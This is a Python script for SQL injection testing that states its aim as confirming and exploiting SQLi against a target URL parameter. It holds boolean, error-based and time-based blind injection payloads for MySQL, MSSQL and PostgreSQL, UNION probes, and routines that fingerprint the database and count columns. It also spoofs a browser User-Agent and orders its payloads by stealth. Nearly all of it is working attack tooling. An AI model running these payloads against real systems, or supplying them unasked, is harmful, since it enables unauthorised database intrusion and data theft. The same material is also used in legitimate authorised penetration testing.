### Web Application SQL Injection Testing\r
```python\r
#!/usr/bin/env python3\r
""\"\r
Manual SQL injection testing methodology.\r
Not a scanner — a structured approach to confirm and exploit SQLi.\r
""\"\r
\r
import requests\r
from urllib.parse import quote\r
\r
class SQLiTester:\r
    ""\"Test SQL injection vectors against a target parameter.""\"\r
\r
    # Detection payloads — ordered by stealth (least suspicious first)\r
    DETECTION_PAYLOADS = [\r
        # Boolean-based: if the response changes, injection is likely\r
        ("' AND '1'='1", "' AND '1'='2"),\r
        # Error-based: trigger verbose database errors\r
        ("'", "' OR '"),\r
        # Time-based blind: if no visible change, use delays\r
        ("' AND SLEEP(5)-- -", "' AND SLEEP(0)-- -"),       # MySQL\r
        ("'; WAITFOR DELAY '0:0:5'-- -", ""),                # MSSQL\r
        ("' AND pg_sleep(5)-- -", ""),                        # PostgreSQL\r
    ]\r
\r
    # UNION-based column enumeration\r
    UNION_PROBES = [\r
        "' UNION SELECT {cols}-- -",\r
        "' UNION ALL SELECT {cols}-- -",\r
        "') UNION SELECT {cols}-- -",\r
    ]\r
\r
    def __init__(self, target_url: str, param: str, method: str = "GET"):\r
        self.target_url = target_url\r
        self.param = param\r
        self.method = method\r
        self.session = requests.Session()\r
        self.session.headers["User-Agent"] = (\r
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "\r
            "AppleWebKit/537.36 (KHTML, like Gecko) "\r
            "Chrome/120.0.0.0 Safari/537.36"\r
        )\r
\r
    def test_boolean_based(self) -> dict:\r
        ""\"Compare true/false responses to detect boolean-based SQLi.""\"\r
        results = []\r
        for true_payload, false_payload in self.DETECTION_PAYLOADS:\r
            if not false_payload:\r
                continue\r
            resp_true = self._inject(true_payload)\r
            resp_false = self._inject(false_payload)\r
\r
            if resp_true.status_code == resp_false.status_code:\r
                # Same status code — check content length difference\r
                len_diff = abs(len(resp_true.text) - len(resp_false.text))\r
                if len_diff > 50:\r
                    results.append({\r
                        "type": "boolean-based",\r
                        "true_payload": true_payload,\r
                        "false_payload": false_payload,\r
                        "content_length_delta": len_diff,\r
                        "confidence": "high" if len_diff > 200 else "medium",\r
                    })\r
        return results\r
\r
    def test_error_based(self) -> dict:\r
        ""\"Trigger database errors to confirm injection and identify DBMS.""\"\r
        error_signatures = {\r
            "MySQL": ["SQL syntax", "MariaDB", "mysql_fetch"],\r
            "PostgreSQL": ["pg_query", "PG::SyntaxError", "unterminated"],\r
            "MSSQL": ["Unclosed quotation", "mssql", "SqlException"],\r
            "Oracle": ["ORA-", "oracle", "quoted string not properly"],\r
            "SQLite": ["SQLITE_ERROR", "sqlite3", "unrecognized token"],\r
        }\r
        resp = self._inject("'")\r
        for dbms, signatures in error_signatures.items():\r
            for sig in signatures:\r
                if sig.lower() in resp.text.lower():\r
                    return {"type": "error-based", "dbms": dbms,\r
                            "signature": sig, "confidence": "high"}\r
        return {}\r
\r
    def enumerate_columns(self, max_cols: int = 20) -> int:\r
        ""\"Find the number of columns using ORDER BY.""\"\r
        for n in range(1, max_cols + 1):\r
            resp = self._inject(f"' ORDER BY {n}-- -")\r
            if resp.status_code >= 500 or "Unknown column" in resp.text:\r
                return n - 1\r
        return 0\r
\r
    def _inject(self, payload: str) -> requests.Response:\r
        ""\"Inject payload into the target parameter.""\"\r
        if self.method.upper() == "GET":\r
            return self.session.get(\r
                self.target_url, params={self.param: payload}, timeout=15\r
            )\r
        return self.session.post(\r
            self.target_url, data={self.param: payload}, timeout=15\r
        )\r
\r
\r
